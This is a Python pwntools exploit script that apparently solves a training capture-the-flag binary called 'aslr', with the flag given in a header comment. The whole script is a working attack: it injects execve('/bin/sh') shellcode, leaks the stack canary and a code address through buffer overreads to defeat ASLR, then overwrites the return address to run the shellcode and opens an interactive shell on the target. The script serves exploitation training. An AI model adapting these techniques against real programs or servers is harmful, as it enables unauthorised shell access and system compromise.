# flag{you_can_also_leak_the_binary_And_compute_bss!}

import sys
from pwn import *
from pwn import p64, u64


def send(p, payload):
    p.send(payload)


def send_payload(p, payload):
    p.send(payload)
    time.sleep(0.1)
    # p.interactive()
    p.recvuntil(b"> ")
    p.recv(len(payload))


if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2012)
else:
    p = process("./aslr")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x100a13
    c
    """)

shellcode = asm("""
mov rdi, 0x0068732f6e69622f
push rdi    
mov rdi, rsp          

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall

mov rax, 0x3c
mov rdi, 13
syscall
""", arch='amd64')

p.recvuntil(b"Welcome to Leakers!\n\n")
send(p, shellcode)
time.sleep(0.1)  # avoid read of additional data

offset = 104 + 1  # the first char of the canary is 00
send_payload(p, b"A" * offset)
canary = u64(b"\x00" + p.recv(7))

print("canary", hex(canary))

offset = 104 + 8
send_payload(p, b"A" * offset)
leak = p.recv(6)
address = u64(leak.ljust(8, b"\x00"))
print("address", hex(address))

# offset between main address leaked
# and global varibale where the shellcode is placed
address += 0x2005C0

payload = b""
payload = payload.ljust(104, b"\x90") + p64(canary) + b"A" * 8 + p64(address)
send(p, payload)
time.sleep(0.1)

send(p, b"\n")
time.sleep(0.1)

p.recvuntil(b"Bye!\n")

# p.sendline(b"ls")

p.interactive()
